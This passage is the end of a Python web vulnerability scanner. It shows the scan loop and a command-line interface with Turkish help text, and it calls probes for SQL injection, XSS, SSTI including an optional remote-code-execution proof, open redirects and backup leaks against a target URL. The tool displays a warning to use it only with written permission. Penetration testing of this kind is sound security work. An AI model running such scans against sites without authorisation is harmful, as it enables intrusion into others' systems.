    r_base = fetch(base)
    if r_base and is_parked(r_base.text):
        evidence.add("parked_page", base, {"engine": "parking-signature"})

    if login_url and auth_user and auth_pass:
        try:
            login_with_playwright_and_copy_cookies(login_url, auth_user, auth_pass)
            evidence.add("auth_ok", login_url, {"user": auth_user})
        except Exception as e:
            evidence.add("auth_fail", login_url, {"error": str(e)})

    urls = crawl(base, max_pages=max_pages, include_re=include_pattern or None,
                 exclude_re=exclude_pattern or None, rate_ms=rate_ms)
    evidence.add("crawl", base, {"count": len(urls)})

    for u in urls:
        header_checks(u)
        follow_redirects(u)
        csp_note(u)

        forms_probe(u, rate_ms=rate_ms)
        ssti_poc(u, rate_ms=rate_ms)

        if enable_ssti_rce:
            ssti_rce_guarded(u, rate_ms=rate_ms)

        if enable_xss_deep:
            xss_reflected_sweep(u, rate_ms=rate_ms, max_params=max_params_per_page)

        if enable_unknown_probe:
            unknown_probe(u, rate_ms=rate_ms, max_params=max_params_per_page)

        open_redirect_probe(u, rate_ms=rate_ms)
        analyze_jnlp(u, rate_ms=rate_ms)
        directory_listing_probe(u, rate_ms=rate_ms)
        backup_leak_probe(u, rate_ms=rate_ms)

        if enable_sql:
            sqli_probe(u, rate_ms=rate_ms, max_params=max_params_per_page, enable_time=enable_sql_time)
            sqli_probe_forms(u, rate_ms=rate_ms, enable_time=enable_sql_time)

    if enable_xss_deep:
        dom_xss_playwright_deep(base)

    json_path = evidence.dump_json()
    evidence.dump_markdown()
    evidence.print_console_summary()
    return json_path


# -------------------- CLI --------------------

@app.command(help="Tek parametreyle FULL tarama.")
def quick(
    base: str = typer.Argument(..., help="Hedef base URL, ör: https://site.com"),
    enable_ssti_rce: bool = typer.Option(False, help="(LOCAL) Sınırlı SSTI RCE kanıtı"),
    enable_sql_time: bool = typer.Option(False, help="(LOCAL) SQLi time-based POC"),
    rate_ms: int = typer.Option(300, help="İstekler arası gecikme (ms)"),
    max_pages: int = typer.Option(60, help="Maksimum sayfa"),
    max_params_per_page: int = typer.Option(8, help="Parametre sınırı"),
    include_pattern: str = typer.Option("", help="Crawl include regex"),
    exclude_pattern: str = typer.Option("", help="Crawl exclude regex"),
) -> None:
    typer.secho("⚠ Bu aracı yalnızca YAZILI İZİN alınmış hedeflerde kullanın.", fg=typer.colors.YELLOW)
    run_scan(
        base=base,
        enable_ssti_rce=enable_ssti_rce,
        enable_xss_deep=True,
        enable_unknown_probe=True,
        enable_sql=True,
        enable_sql_time=enable_sql_time,
        max_pages=max_pages,
        max_params_per_page=max_params_per_page,
        rate_ms=rate_ms,
        include_pattern=include_pattern or "",
        exclude_pattern=exclude_pattern or "",
    )
    typer.secho("++++ Tarama tamamlandı. Raporlar: report.json, report.md", fg=typer.colors.GREEN)


@app.command(help="Gelişmiş tarama (login, SQLi, filtreler, vb.).")
def scan(
    base: str = typer.Argument(..., help="Hedef base URL, ör: https://site.com"),
    auth_user: str = typer.Option("", help="(Opsiyonel) Test kullanıcı"),
    auth_pass: str = typer.Option("", help="(Opsiyonel) Test parola"),
    login_url: str = typer.Option("", help="(Opsiyonel) Login formu URL’si"),
    include_pattern: str = typer.Option("", help="Crawl include regex"),
    exclude_pattern: str = typer.Option("", help="Crawl exclude regex"),
    enable_ssti_rce: bool = typer.Option(False, help="(LAB) Sınırlı SSTI RCE kanıtı"),
    enable_xss_deep: bool = typer.Option(True, help="XSS (Reflected + DOM)"),
    enable_unknown_probe: bool = typer.Option(True, help="Anomali/heuristik"),
    enable_sql: bool = typer.Option(True, help="SQLi POC taraması"),
    enable_sql_time: bool = typer.Option(False, help="SQLi time-based POC (LAB)"),
    max_pages: int = typer.Option(60, help="Maksimum sayfa"),
    max_params_per_page: int = typer.Option(8, help="Parametre sınırı"),
    rate_ms: int = typer.Option(300, help="İstekler arası gecikme (ms)"),
) -> None:
    typer.secho("⚠ Bu aracı yalnızca YAZILI İZİN alınmış hedeflerde kullanın.", fg=typer.colors.YELLOW)
    run_scan(
        base=base,
        login_url=login_url,
        auth_user=auth_user,
        auth_pass=auth_pass,
        include_pattern=include_pattern,
        exclude_pattern=exclude_pattern,
        enable_ssti_rce=enable_ssti_rce,
        enable_xss_deep=enable_xss_deep,
        enable_unknown_probe=enable_unknown_probe,
        enable_sql=enable_sql,
        enable_sql_time=enable_sql_time,
        max_pages=max_pages,
        max_params_per_page=max_params_per_page,
        rate_ms=rate_ms,
    )
    typer.secho("++++ Tarama tamamlandı. Raporlar: report.json, report.md", fg=typer.colors.GREEN)


if __name__ == "__main__":
    app()
